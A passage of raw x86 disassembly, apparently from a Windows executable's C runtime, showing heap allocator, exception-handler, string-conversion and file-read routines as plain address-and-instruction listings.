  404665:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  40466c:	dec    BYTE PTR [ecx]
  40466e:	jne    0x404676
  404670:	mov    ecx,DWORD PTR [ebp+0x8]
  404673:	and    DWORD PTR [ecx+0x4],ebx
  404676:	mov    ebx,DWORD PTR [ebp+0xc]
  404679:	mov    ecx,DWORD PTR [edi+0x8]
  40467c:	mov    esi,DWORD PTR [edi+0x4]
  40467f:	mov    DWORD PTR [ecx+0x4],esi
  404682:	mov    esi,DWORD PTR [edi+0x8]
  404685:	mov    ecx,DWORD PTR [edi+0x4]
  404688:	mov    DWORD PTR [ecx+0x8],esi
  40468b:	mov    esi,DWORD PTR [ebp+0x10]
  40468e:	add    esi,DWORD PTR [ebp-0x4]
  404691:	mov    DWORD PTR [ebp+0x10],esi
  404694:	sar    esi,0x4
  404697:	dec    esi
  404698:	cmp    esi,0x3f
  40469b:	jbe    0x4046a0
  40469d:	push   0x3f
  40469f:	pop    esi
  4046a0:	mov    ecx,DWORD PTR [ebp-0xc]
  4046a3:	lea    ecx,[ecx+esi*8]
  4046a6:	mov    edi,DWORD PTR [ecx+0x4]
  4046a9:	mov    DWORD PTR [ebx+0x8],ecx
  4046ac:	mov    DWORD PTR [ebx+0x4],edi
  4046af:	mov    DWORD PTR [ecx+0x4],ebx
  4046b2:	mov    ecx,DWORD PTR [ebx+0x4]
  4046b5:	mov    DWORD PTR [ecx+0x8],ebx
  4046b8:	mov    ecx,DWORD PTR [ebx+0x4]
  4046bb:	cmp    ecx,DWORD PTR [ebx+0x8]
  4046be:	jne    0x404717
  4046c0:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4046c4:	mov    BYTE PTR [ebp+0xf],cl
  4046c7:	inc    cl
  4046c9:	cmp    esi,0x20
  4046cc:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4046d0:	jae    0x4046ee
  4046d2:	cmp    BYTE PTR [ebp+0xf],0x0
  4046d6:	jne    0x4046e6
  4046d8:	mov    ecx,esi
  4046da:	mov    edi,0x80000000
  4046df:	shr    edi,cl
  4046e1:	mov    ecx,DWORD PTR [ebp+0x8]
  4046e4:	or     DWORD PTR [ecx],edi
  4046e6:	lea    eax,[eax+edx*4+0x44]
  4046ea:	mov    ecx,esi
  4046ec:	jmp    0x40470e
  4046ee:	cmp    BYTE PTR [ebp+0xf],0x0
  4046f2:	jne    0x404704
  4046f4:	lea    ecx,[esi-0x20]
  4046f7:	mov    edi,0x80000000
  4046fc:	shr    edi,cl
  4046fe:	mov    ecx,DWORD PTR [ebp+0x8]
  404701:	or     DWORD PTR [ecx+0x4],edi
  404704:	lea    eax,[eax+edx*4+0xc4]
  40470b:	lea    ecx,[esi-0x20]
  40470e:	mov    edx,0x80000000
  404713:	shr    edx,cl
  404715:	or     DWORD PTR [eax],edx
  404717:	mov    eax,DWORD PTR [ebp+0x10]
  40471a:	mov    DWORD PTR [ebx],eax
  40471c:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  404720:	xor    eax,eax
  404722:	inc    eax
  404723:	pop    edi
  404724:	pop    esi
  404725:	pop    ebx
  404726:	leave  
  404727:	ret    
  404728:	push   ebp
  404729:	mov    ebp,esp
  40472b:	sub    esp,0x14
  40472e:	mov    ecx,DWORD PTR [ebp+0x8]
  404731:	mov    eax,ds:0x4289a8
  404736:	mov    edx,DWORD PTR ds:0x4289ac
  40473c:	add    ecx,0x17
  40473f:	and    ecx,0xfffffff0
  404742:	push   ebx
  404743:	mov    DWORD PTR [ebp-0x10],ecx
  404746:	sar    ecx,0x4
  404749:	push   esi
  40474a:	lea    eax,[eax+eax*4]
  40474d:	push   edi
  40474e:	dec    ecx
  40474f:	cmp    ecx,0x20
  404752:	lea    edi,[edx+eax*4]
  404755:	mov    DWORD PTR [ebp-0x4],edi
  404758:	jge    0x404765
  40475a:	or     esi,0xffffffff
  40475d:	shr    esi,cl
  40475f:	or     DWORD PTR [ebp-0x8],0xffffffff
  404763:	jmp    0x404772
  404765:	add    ecx,0xffffffe0
  404768:	or     eax,0xffffffff
  40476b:	xor    esi,esi
  40476d:	shr    eax,cl
  40476f:	mov    DWORD PTR [ebp-0x8],eax
  404772:	mov    eax,ds:0x4289b4
  404777:	mov    ebx,eax
  404779:	mov    DWORD PTR [ebp-0xc],esi
  40477c:	cmp    ebx,edi
  40477e:	jmp    0x404794
  404780:	mov    ecx,DWORD PTR [ebx+0x4]
  404783:	mov    edi,DWORD PTR [ebx]
  404785:	and    ecx,DWORD PTR [ebp-0x8]
  404788:	and    edi,esi
  40478a:	or     ecx,edi
  40478c:	jne    0x404799
  40478e:	add    ebx,0x14
  404791:	cmp    ebx,DWORD PTR [ebp-0x4]
  404794:	mov    DWORD PTR [ebp+0x8],ebx
  404797:	jb     0x404780
  404799:	cmp    ebx,DWORD PTR [ebp-0x4]
  40479c:	jne    0x4047c2
  40479e:	mov    ebx,edx
  4047a0:	jmp    0x4047b3
  4047a2:	mov    ecx,DWORD PTR [ebx+0x4]
  4047a5:	mov    edi,DWORD PTR [ebx]
  4047a7:	and    ecx,DWORD PTR [ebp-0x8]
  4047aa:	and    edi,esi
  4047ac:	or     ecx,edi
  4047ae:	jne    0x4047ba
  4047b0:	add    ebx,0x14
  4047b3:	cmp    ebx,eax
  4047b5:	mov    DWORD PTR [ebp+0x8],ebx
  4047b8:	jb     0x4047a2
  4047ba:	cmp    ebx,eax
  4047bc:	je     0x404856
  4047c2:	mov    DWORD PTR ds:0x4289b4,ebx
  4047c8:	mov    eax,DWORD PTR [ebx+0x10]
  4047cb:	mov    edx,DWORD PTR [eax]
  4047cd:	cmp    edx,0xffffffff
  4047d0:	mov    DWORD PTR [ebp-0x4],edx
  4047d3:	je     0x4047e9
  4047d5:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4047dc:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4047e0:	and    ecx,DWORD PTR [ebp-0x8]
  4047e3:	and    edi,esi
  4047e5:	or     ecx,edi
  4047e7:	jne    0x40481f
  4047e9:	mov    edx,DWORD PTR [eax+0xc4]
  4047ef:	and    edx,DWORD PTR [ebp-0x8]
  4047f2:	and    DWORD PTR [ebp-0x4],0x0
  4047f6:	lea    ecx,[eax+0x44]
  4047f9:	mov    esi,DWORD PTR [ecx]
  4047fb:	and    esi,DWORD PTR [ebp-0xc]
  4047fe:	or     edx,esi
  404800:	mov    esi,DWORD PTR [ebp-0xc]
  404803:	jne    0x40481c
  404805:	mov    edx,DWORD PTR [ecx+0x84]
  40480b:	and    edx,DWORD PTR [ebp-0x8]
  40480e:	inc    DWORD PTR [ebp-0x4]
  404811:	add    ecx,0x4
  404814:	mov    edi,DWORD PTR [ecx]
  404816:	and    edi,esi
  404818:	or     edx,edi
  40481a:	je     0x404805
  40481c:	mov    edx,DWORD PTR [ebp-0x4]
  40481f:	mov    ecx,edx
  404821:	imul   ecx,ecx,0x204
  404827:	lea    ecx,[ecx+eax*1+0x144]
  40482e:	mov    DWORD PTR [ebp-0xc],ecx
  404831:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  404835:	xor    edi,edi
  404837:	and    ecx,esi
  404839:	jne    0x4048a8
  40483b:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  404842:	and    ecx,DWORD PTR [ebp-0x8]
  404845:	push   0x20
  404847:	pop    edi
  404848:	jmp    0x4048a8
  40484a:	cmp    DWORD PTR [ebx+0x8],0x0
  40484e:	jne    0x40485b
  404850:	add    ebx,0x14
  404853:	mov    DWORD PTR [ebp+0x8],ebx
  404856:	cmp    ebx,DWORD PTR [ebp-0x4]
  404859:	jb     0x40484a
  40485b:	cmp    ebx,DWORD PTR [ebp-0x4]
  40485e:	jne    0x404886
  404860:	mov    ebx,edx
  404862:	jmp    0x40486d
  404864:	cmp    DWORD PTR [ebx+0x8],0x0
  404868:	jne    0x404874
  40486a:	add    ebx,0x14
  40486d:	cmp    ebx,eax
  40486f:	mov    DWORD PTR [ebp+0x8],ebx
  404872:	jb     0x404864
  404874:	cmp    ebx,eax
  404876:	jne    0x404886
  404878:	call   0x40428c
  40487d:	mov    ebx,eax
  40487f:	test   ebx,ebx
  404881:	mov    DWORD PTR [ebp+0x8],ebx
  404884:	je     0x40489e
  404886:	push   ebx
  404887:	call   0x404343
  40488c:	pop    ecx
  40488d:	mov    ecx,DWORD PTR [ebx+0x10]
  404890:	mov    DWORD PTR [ecx],eax
  404892:	mov    eax,DWORD PTR [ebx+0x10]
  404895:	cmp    DWORD PTR [eax],0xffffffff
  404898:	jne    0x4047c2
  40489e:	xor    eax,eax
  4048a0:	jmp    0x404a1f
  4048a5:	shl    ecx,1
  4048a7:	inc    edi
  4048a8:	test   ecx,ecx
  4048aa:	jge    0x4048a5
  4048ac:	mov    ecx,DWORD PTR [ebp-0xc]
  4048af:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4048b3:	mov    ecx,DWORD PTR [edx]
  4048b5:	sub    ecx,DWORD PTR [ebp-0x10]
  4048b8:	mov    esi,ecx
  4048ba:	sar    esi,0x4
  4048bd:	dec    esi
  4048be:	cmp    esi,0x3f
  4048c1:	mov    DWORD PTR [ebp-0x8],ecx
  4048c4:	jle    0x4048c9
  4048c6:	push   0x3f
  4048c8:	pop    esi
  4048c9:	cmp    esi,edi
  4048cb:	je     0x4049d2
  4048d1:	mov    ecx,DWORD PTR [edx+0x4]
  4048d4:	cmp    ecx,DWORD PTR [edx+0x8]
  4048d7:	jne    0x404935
  4048d9:	cmp    edi,0x20
  4048dc:	mov    ebx,0x80000000
  4048e1:	jge    0x404909
  4048e3:	mov    ecx,edi
  4048e5:	shr    ebx,cl
  4048e7:	mov    ecx,DWORD PTR [ebp-0x4]
  4048ea:	lea    edi,[eax+edi*1+0x4]
  4048ee:	not    ebx
  4048f0:	mov    DWORD PTR [ebp-0x14],ebx
  4048f3:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4048f7:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4048fb:	dec    BYTE PTR [edi]
  4048fd:	jne    0x404932
  4048ff:	mov    ecx,DWORD PTR [ebp-0x14]
  404902:	mov    ebx,DWORD PTR [ebp+0x8]
  404905:	and    DWORD PTR [ebx],ecx
  404907:	jmp    0x404935
  404909:	lea    ecx,[edi-0x20]
  40490c:	shr    ebx,cl
  40490e:	mov    ecx,DWORD PTR [ebp-0x4]
  404911:	lea    ecx,[eax+ecx*4+0xc4]
  404918:	lea    edi,[eax+edi*1+0x4]
  40491c:	not    ebx
  40491e:	and    DWORD PTR [ecx],ebx
  404920:	dec    BYTE PTR [edi]
  404922:	mov    DWORD PTR [ebp-0x14],ebx
  404925:	jne    0x404932
  404927:	mov    ebx,DWORD PTR [ebp+0x8]
  40492a:	mov    ecx,DWORD PTR [ebp-0x14]
  40492d:	and    DWORD PTR [ebx+0x4],ecx
  404930:	jmp    0x404935
  404932:	mov    ebx,DWORD PTR [ebp+0x8]
  404935:	cmp    DWORD PTR [ebp-0x8],0x0
  404939:	mov    ecx,DWORD PTR [edx+0x8]
  40493c:	mov    edi,DWORD PTR [edx+0x4]
  40493f:	mov    DWORD PTR [ecx+0x4],edi
  404942:	mov    ecx,DWORD PTR [edx+0x4]
  404945:	mov    edi,DWORD PTR [edx+0x8]
  404948:	mov    DWORD PTR [ecx+0x8],edi
  40494b:	je     0x4049de
  404951:	mov    ecx,DWORD PTR [ebp-0xc]
  404954:	lea    ecx,[ecx+esi*8]
  404957:	mov    edi,DWORD PTR [ecx+0x4]
  40495a:	mov    DWORD PTR [edx+0x8],ecx
  40495d:	mov    DWORD PTR [edx+0x4],edi
  404960:	mov    DWORD PTR [ecx+0x4],edx
  404963:	mov    ecx,DWORD PTR [edx+0x4]
  404966:	mov    DWORD PTR [ecx+0x8],edx
  404969:	mov    ecx,DWORD PTR [edx+0x4]
  40496c:	cmp    ecx,DWORD PTR [edx+0x8]
  40496f:	jne    0x4049cf
  404971:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  404975:	mov    BYTE PTR [ebp+0xb],cl
  404978:	inc    cl
  40497a:	cmp    esi,0x20
  40497d:	mov    BYTE PTR [esi+eax*1+0x4],cl
  404981:	jge    0x4049a6
  404983:	cmp    BYTE PTR [ebp+0xb],0x0
  404987:	jne    0x404994
  404989:	mov    edi,0x80000000
  40498e:	mov    ecx,esi
  404990:	shr    edi,cl
  404992:	or     DWORD PTR [ebx],edi
  404994:	mov    ecx,esi
  404996:	mov    edi,0x80000000
  40499b:	shr    edi,cl
  40499d:	mov    ecx,DWORD PTR [ebp-0x4]
  4049a0:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4049a4:	jmp    0x4049cf
  4049a6:	cmp    BYTE PTR [ebp+0xb],0x0
  4049aa:	jne    0x4049b9
  4049ac:	lea    ecx,[esi-0x20]
  4049af:	mov    edi,0x80000000
  4049b4:	shr    edi,cl
  4049b6:	or     DWORD PTR [ebx+0x4],edi
  4049b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4049bc:	lea    edi,[eax+ecx*4+0xc4]
  4049c3:	lea    ecx,[esi-0x20]
  4049c6:	mov    esi,0x80000000
  4049cb:	shr    esi,cl
  4049cd:	or     DWORD PTR [edi],esi
  4049cf:	mov    ecx,DWORD PTR [ebp-0x8]
  4049d2:	test   ecx,ecx
  4049d4:	je     0x4049e1
  4049d6:	mov    DWORD PTR [edx],ecx
  4049d8:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4049dc:	jmp    0x4049e1
  4049de:	mov    ecx,DWORD PTR [ebp-0x8]
  4049e1:	mov    esi,DWORD PTR [ebp-0x10]
  4049e4:	add    edx,ecx
  4049e6:	lea    ecx,[esi+0x1]
  4049e9:	mov    DWORD PTR [edx],ecx
  4049eb:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4049ef:	mov    esi,DWORD PTR [ebp-0xc]
  4049f2:	mov    ecx,DWORD PTR [esi]
  4049f4:	test   ecx,ecx
  4049f6:	lea    edi,[ecx+0x1]
  4049f9:	mov    DWORD PTR [esi],edi
  4049fb:	jne    0x404a17
  4049fd:	cmp    ebx,DWORD PTR ds:0x4289a4
  404a03:	jne    0x404a17
  404a05:	mov    ecx,DWORD PTR [ebp-0x4]
  404a08:	cmp    ecx,DWORD PTR ds:0x4289bc
  404a0e:	jne    0x404a17
  404a10:	and    DWORD PTR ds:0x4289a4,0x0
  404a17:	mov    ecx,DWORD PTR [ebp-0x4]
  404a1a:	mov    DWORD PTR [eax],ecx
  404a1c:	lea    eax,[edx+0x4]
  404a1f:	pop    edi
  404a20:	pop    esi
  404a21:	pop    ebx
  404a22:	leave  
  404a23:	ret    
  404a24:	push   esi
  404a25:	inc    ebx
  404a26:	xor    dh,BYTE PTR [eax]
  404a28:	pop    eax
  404a29:	inc    ebx
  404a2a:	xor    BYTE PTR [eax],dh
  404a2c:	push   ebp
  404a2d:	mov    ebp,esp
  404a2f:	sub    esp,0x8
  404a32:	push   ebx
  404a33:	push   esi
  404a34:	push   edi
  404a35:	push   ebp
  404a36:	cld    
  404a37:	mov    ebx,DWORD PTR [ebp+0xc]
  404a3a:	mov    eax,DWORD PTR [ebp+0x8]
  404a3d:	test   DWORD PTR [eax+0x4],0x6
  404a44:	jne    0x404acc
  404a4a:	mov    DWORD PTR [ebp-0x8],eax
  404a4d:	mov    eax,DWORD PTR [ebp+0x10]
  404a50:	mov    DWORD PTR [ebp-0x4],eax
  404a53:	lea    eax,[ebp-0x8]
  404a56:	mov    DWORD PTR [ebx-0x4],eax
  404a59:	mov    esi,DWORD PTR [ebx+0xc]
  404a5c:	mov    edi,DWORD PTR [ebx+0x8]
  404a5f:	cmp    esi,0xffffffff
  404a62:	je     0x404ac5
  404a64:	lea    ecx,[esi+esi*2]
  404a67:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  404a6c:	je     0x404ab3
  404a6e:	push   esi
  404a6f:	push   ebp
  404a70:	lea    ebp,[ebx+0x10]
  404a73:	call   DWORD PTR [edi+ecx*4+0x4]
  404a77:	pop    ebp
  404a78:	pop    esi
  404a79:	mov    ebx,DWORD PTR [ebp+0xc]
  404a7c:	or     eax,eax
  404a7e:	je     0x404ab3
  404a80:	js     0x404abe
  404a82:	mov    edi,DWORD PTR [ebx+0x8]
  404a85:	push   ebx
  404a86:	call   0x405940
  404a8b:	add    esp,0x4
  404a8e:	lea    ebp,[ebx+0x10]
  404a91:	push   esi
  404a92:	push   ebx
  404a93:	call   0x405982
  404a98:	add    esp,0x8
  404a9b:	lea    ecx,[esi+esi*2]
  404a9e:	push   0x1
  404aa0:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  404aa4:	call   0x405a16
  404aa9:	mov    eax,DWORD PTR [edi+ecx*4]
  404aac:	mov    DWORD PTR [ebx+0xc],eax
  404aaf:	call   DWORD PTR [edi+ecx*4+0x8]
  404ab3:	mov    edi,DWORD PTR [ebx+0x8]
  404ab6:	lea    ecx,[esi+esi*2]
  404ab9:	mov    esi,DWORD PTR [edi+ecx*4]
  404abc:	jmp    0x404a5f
  404abe:	mov    eax,0x0
  404ac3:	jmp    0x404ae1
  404ac5:	mov    eax,0x1
  404aca:	jmp    0x404ae1
  404acc:	push   ebp
  404acd:	lea    ebp,[ebx+0x10]
  404ad0:	push   0xffffffff
  404ad2:	push   ebx
  404ad3:	call   0x405982
  404ad8:	add    esp,0x8
  404adb:	pop    ebp
  404adc:	mov    eax,0x1
  404ae1:	pop    ebp
  404ae2:	pop    edi
  404ae3:	pop    esi
  404ae4:	pop    ebx
  404ae5:	mov    esp,ebp
  404ae7:	pop    ebp
  404ae8:	ret    
  404ae9:	push   ebp
  404aea:	mov    ecx,DWORD PTR [esp+0x8]
  404aee:	mov    ebp,DWORD PTR [ecx]
  404af0:	mov    eax,DWORD PTR [ecx+0x1c]
  404af3:	push   eax
  404af4:	mov    eax,DWORD PTR [ecx+0x18]
  404af7:	push   eax
  404af8:	call   0x405982
  404afd:	add    esp,0x8
  404b00:	pop    ebp
  404b01:	ret    0x4
  404b04:	push   0x1c
  404b06:	push   0x425960
  404b0b:	call   0x4030a4
  404b10:	xor    esi,esi
  404b12:	cmp    DWORD PTR ds:0x42794c,esi
  404b18:	jne    0x404b4f
  404b1a:	lea    eax,[ebp-0x1c]
  404b1d:	push   eax
  404b1e:	xor    edi,edi
  404b20:	inc    edi
  404b21:	push   edi
  404b22:	push   0x42595c
  404b27:	push   edi
  404b28:	call   DWORD PTR ds:0x4250b4
  404b2e:	test   eax,eax
  404b30:	je     0x404b3a
  404b32:	mov    DWORD PTR ds:0x42794c,edi
  404b38:	jmp    0x404b4f
  404b3a:	call   DWORD PTR ds:0x42501c
  404b40:	cmp    eax,0x78
  404b43:	jne    0x404b4f
  404b45:	mov    DWORD PTR ds:0x42794c,0x2
  404b4f:	mov    eax,ds:0x42794c
  404b54:	cmp    eax,0x2
  404b57:	je     0x404c47
  404b5d:	cmp    eax,esi
  404b5f:	je     0x404c47
  404b65:	cmp    eax,0x1
  404b68:	jne    0x404c6d
  404b6e:	mov    DWORD PTR [ebp-0x20],esi
  404b71:	mov    DWORD PTR [ebp-0x24],esi
  404b74:	cmp    DWORD PTR [ebp+0x18],esi
  404b77:	jne    0x404b81
  404b79:	mov    eax,ds:0x427968
  404b7e:	mov    DWORD PTR [ebp+0x18],eax
  404b81:	push   esi
  404b82:	push   esi
  404b83:	push   DWORD PTR [ebp+0x10]
  404b86:	push   DWORD PTR [ebp+0xc]
  404b89:	xor    eax,eax
  404b8b:	cmp    DWORD PTR [ebp+0x20],esi
  404b8e:	setne  al
  404b91:	lea    eax,[eax*8+0x1]
  404b98:	push   eax
  404b99:	push   DWORD PTR [ebp+0x18]
  404b9c:	call   DWORD PTR ds:0x42508c
  404ba2:	mov    edi,eax
  404ba4:	mov    DWORD PTR [ebp-0x28],edi
  404ba7:	test   edi,edi
  404ba9:	je     0x404c6d
  404baf:	and    DWORD PTR [ebp-0x4],0x0
  404bb3:	lea    ebx,[edi+edi*1]
  404bb6:	mov    eax,ebx
  404bb8:	add    eax,0x3
  404bbb:	and    eax,0xfffffffc
  404bbe:	call   0x4030f0
  404bc3:	mov    DWORD PTR [ebp-0x18],esp
  404bc6:	mov    esi,esp
  404bc8:	mov    DWORD PTR [ebp-0x2c],esi
  404bcb:	push   ebx
  404bcc:	push   0x0
  404bce:	push   esi
  404bcf:	call   0x403420
  404bd4:	add    esp,0xc
  404bd7:	or     DWORD PTR [ebp-0x4],0xffffffff
  404bdb:	jmp    0x404bf2
  404bdd:	xor    eax,eax
  404bdf:	inc    eax
  404be0:	ret    
  404be1:	mov    esp,DWORD PTR [ebp-0x18]
  404be4:	call   0x403504
  404be9:	xor    esi,esi
  404beb:	or     DWORD PTR [ebp-0x4],0xffffffff
  404bef:	mov    edi,DWORD PTR [ebp-0x28]
  404bf2:	test   esi,esi
  404bf4:	jne    0x404c0d
  404bf6:	push   edi
  404bf7:	push   0x2
  404bf9:	call   0x405c46
  404bfe:	pop    ecx
  404bff:	pop    ecx
  404c00:	mov    esi,eax
  404c02:	test   esi,esi
  404c04:	je     0x404c6d
  404c06:	mov    DWORD PTR [ebp-0x24],0x1
  404c0d:	push   edi
  404c0e:	push   esi
  404c0f:	push   DWORD PTR [ebp+0x10]
  404c12:	push   DWORD PTR [ebp+0xc]
  404c15:	push   0x1
  404c17:	push   DWORD PTR [ebp+0x18]
  404c1a:	call   DWORD PTR ds:0x42508c
  404c20:	test   eax,eax
  404c22:	je     0x404c35
  404c24:	push   DWORD PTR [ebp+0x14]
  404c27:	push   eax
  404c28:	push   esi
  404c29:	push   DWORD PTR [ebp+0x8]
  404c2c:	call   DWORD PTR ds:0x4250b4
  404c32:	mov    DWORD PTR [ebp-0x20],eax
  404c35:	cmp    DWORD PTR [ebp-0x24],0x0
  404c39:	je     0x404c42
  404c3b:	push   esi
  404c3c:	call   0x40331e
  404c41:	pop    ecx
  404c42:	mov    eax,DWORD PTR [ebp-0x20]
  404c45:	jmp    0x404cb5
  404c47:	mov    ebx,DWORD PTR [ebp+0x1c]
  404c4a:	cmp    ebx,esi
  404c4c:	jne    0x404c54
  404c4e:	mov    ebx,DWORD PTR ds:0x427958
  404c54:	mov    edi,DWORD PTR [ebp+0x18]
  404c57:	test   edi,edi
  404c59:	jne    0x404c61
  404c5b:	mov    edi,DWORD PTR ds:0x427968
  404c61:	push   ebx
  404c62:	call   0x405a2e
  404c67:	pop    ecx
  404c68:	cmp    eax,0xffffffff
  404c6b:	jne    0x404c71
  404c6d:	xor    eax,eax
  404c6f:	jmp    0x404cb5
  404c71:	cmp    eax,edi
  404c73:	je     0x404c93
  404c75:	push   0x0
  404c77:	push   0x0
  404c79:	lea    ecx,[ebp+0x10]
  404c7c:	push   ecx
  404c7d:	push   DWORD PTR [ebp+0xc]
  404c80:	push   eax
  404c81:	push   edi
  404c82:	call   0x405a77
  404c87:	add    esp,0x18
  404c8a:	mov    esi,eax
  404c8c:	test   esi,esi
  404c8e:	je     0x404c6d
  404c90:	mov    DWORD PTR [ebp+0xc],esi
  404c93:	push   DWORD PTR [ebp+0x14]
  404c96:	push   DWORD PTR [ebp+0x10]
  404c99:	push   DWORD PTR [ebp+0xc]
  404c9c:	push   DWORD PTR [ebp+0x8]
  404c9f:	push   ebx
  404ca0:	call   DWORD PTR ds:0x4250b0
  404ca6:	mov    edi,eax
  404ca8:	test   esi,esi
  404caa:	je     0x404cb3
  404cac:	push   esi
  404cad:	call   0x40331e
  404cb2:	pop    ecx
  404cb3:	mov    eax,edi
  404cb5:	lea    esp,[ebp-0x38]
  404cb8:	call   0x4030df
  404cbd:	ret    
  404cbe:	push   ebp
  404cbf:	mov    ebp,esp
  404cc1:	sub    esp,0x10
  404cc4:	push   ebx
  404cc5:	push   esi
  404cc6:	mov    esi,DWORD PTR [ebp+0x8]
  404cc9:	cmp    esi,DWORD PTR ds:0x428c08
  404ccf:	push   edi
  404cd0:	jae    0x404e85
  404cd6:	mov    eax,esi
  404cd8:	sar    eax,0x5
  404cdb:	lea    ebx,[eax*4+0x428c20]
  404ce2:	mov    eax,DWORD PTR [ebx]
  404ce4:	and    esi,0x1f
  404ce7:	shl    esi,0x3
  404cea:	add    eax,esi
  404cec:	mov    dl,BYTE PTR [eax+0x4]
  404cef:	test   dl,0x1
  404cf2:	je     0x404e85
  404cf8:	and    DWORD PTR [ebp-0xc],0x0
  404cfc:	cmp    DWORD PTR [ebp+0x10],0x0
  404d00:	mov    edi,DWORD PTR [ebp+0xc]
  404d03:	mov    ecx,edi
  404d05:	je     0x404d64
  404d07:	test   dl,0x2
  404d0a:	jne    0x404d64
  404d0c:	test   dl,0x48
  404d0f:	je     0x404d2e
  404d11:	mov    al,BYTE PTR [eax+0x5]
  404d14:	cmp    al,0xa
  404d16:	je     0x404d2e
  404d18:	dec    DWORD PTR [ebp+0x10]
  404d1b:	mov    BYTE PTR [edi],al
  404d1d:	mov    eax,DWORD PTR [ebx]
  404d1f:	lea    ecx,[edi+0x1]
  404d22:	mov    DWORD PTR [ebp-0xc],0x1
  404d29:	mov    BYTE PTR [eax+esi*1+0x5],0xa
  404d2e:	push   0x0
  404d30:	lea    eax,[ebp-0x10]
  404d33:	push   eax
  404d34:	push   DWORD PTR [ebp+0x10]
  404d37:	mov    eax,DWORD PTR [ebx]
  404d39:	push   ecx
  404d3a:	push   DWORD PTR [eax+esi*1]
  404d3d:	call   DWORD PTR ds:0x425020
  404d43:	test   eax,eax
  404d45:	jne    0x404d77
  404d47:	call   DWORD PTR ds:0x42501c
  404d4d:	push   0x5
  404d4f:	pop    ecx
  404d50:	cmp    eax,ecx
  404d52:	jne    0x404d5f
  404d54:	mov    DWORD PTR ds:0x4277d0,ecx
  404d5a:	jmp    0x404e8c
  404d5f:	cmp    eax,0x6d
  404d62:	jne    0x404d6b
  404d64:	xor    eax,eax
  404d66:	jmp    0x404e99
  404d6b:	push   eax
  404d6c:	call   0x405d4d
  404d71:	pop    ecx
  404d72:	jmp    0x404e96
  404d77:	mov    eax,DWORD PTR [ebx]
  404d79:	mov    edx,DWORD PTR [ebp-0x10]
  404d7c:	add    DWORD PTR [ebp-0xc],edx
  404d7f:	lea    ecx,[eax+esi*1+0x4]
  404d83:	mov    al,BYTE PTR [ecx]
  404d85:	test   al,al
  404d87:	jns    0x404e80
  404d8d:	test   edx,edx
  404d8f:	je     0x404d9a
  404d91:	cmp    BYTE PTR [edi],0xa
  404d94:	jne    0x404d9a
  404d96:	or     al,0x4
  404d98:	jmp    0x404d9c
  404d9a:	and    al,0xfb
  404d9c:	mov    BYTE PTR [ecx],al
  404d9e:	mov    eax,DWORD PTR [ebp+0xc]
  404da1:	mov    ecx,DWORD PTR [ebp-0xc]
  404da4:	add    ecx,eax
  404da6:	cmp    eax,ecx
  404da8:	mov    DWORD PTR [ebp-0x8],eax
  404dab:	mov    DWORD PTR [ebp-0xc],ecx
  404dae:	jae    0x404e7a
  404db4:	mov    eax,DWORD PTR [ebp-0x8]
  404db7:	mov    al,BYTE PTR [eax]
  404db9:	cmp    al,0x1a
  404dbb:	je     0x404e6a
  404dc1:	cmp    al,0xd
  404dc3:	je     0x404dd0
  404dc5:	mov    BYTE PTR [edi],al
  404dc7:	inc    edi
  404dc8:	inc    DWORD PTR [ebp-0x8]
  404dcb:	jmp    0x404e5c
  404dd0:	dec    ecx
  404dd1:	cmp    DWORD PTR [ebp-0x8],ecx
  404dd4:	jae    0x404dea
  404dd6:	mov    eax,DWORD PTR [ebp-0x8]
  404dd9:	inc    eax
  404dda:	cmp    BYTE PTR [eax],0xa
  404ddd:	jne    0x404de5
  404ddf:	add    DWORD PTR [ebp-0x8],0x2
  404de3:	jmp    0x404e3e
  404de5:	mov    DWORD PTR [ebp-0x8],eax
  404de8:	jmp    0x404e58
  404dea:	inc    DWORD PTR [ebp-0x8]
  404ded:	push   0x0
  404def:	lea    eax,[ebp-0x10]
  404df2:	push   eax
  404df3:	push   0x1
  404df5:	lea    eax,[ebp-0x1]
  404df8:	push   eax
  404df9:	mov    eax,DWORD PTR [ebx]
  404dfb:	push   DWORD PTR [eax+esi*1]
  404dfe:	call   DWORD PTR ds:0x425020
  404e04:	test   eax,eax
  404e06:	jne    0x404e12
  404e08:	call   DWORD PTR ds:0x42501c
  404e0e:	test   eax,eax
  404e10:	jne    0x404e58
  404e12:	cmp    DWORD PTR [ebp-0x10],0x0
  404e16:	je     0x404e58
  404e18:	mov    eax,DWORD PTR [ebx]
  404e1a:	test   BYTE PTR [eax+esi*1+0x4],0x48
  404e1f:	je     0x404e33
  404e21:	mov    al,BYTE PTR [ebp-0x1]
  404e24:	cmp    al,0xa
  404e26:	je     0x404e3e
  404e28:	mov    BYTE PTR [edi],0xd
  404e2b:	mov    ecx,DWORD PTR [ebx]
  404e2d:	mov    BYTE PTR [ecx+esi*1+0x5],al
  404e31:	jmp    0x404e5b
  404e33:	cmp    edi,DWORD PTR [ebp+0xc]
  404e36:	jne    0x404e43
  404e38:	cmp    BYTE PTR [ebp-0x1],0xa
  404e3c:	jne    0x404e43
  404e3e:	mov    BYTE PTR [edi],0xa
  404e41:	jmp    0x404e5b
  404e43:	push   0x1
  404e45:	push   0xffffffff
  404e47:	push   DWORD PTR [ebp+0x8]
  404e4a:	call   0x405cc1
  404e4f:	add    esp,0xc
  404e52:	cmp    BYTE PTR [ebp-0x1],0xa
  404e56:	je     0x404e5c
  404e58:	mov    BYTE PTR [edi],0xd
  404e5b:	inc    edi
  404e5c:	mov    ecx,DWORD PTR [ebp-0xc]
  404e5f:	cmp    DWORD PTR [ebp-0x8],ecx
  404e62:	jb     0x404db4
  404e68:	jmp    0x404e7a
  404e6a:	mov    eax,DWORD PTR [ebx]
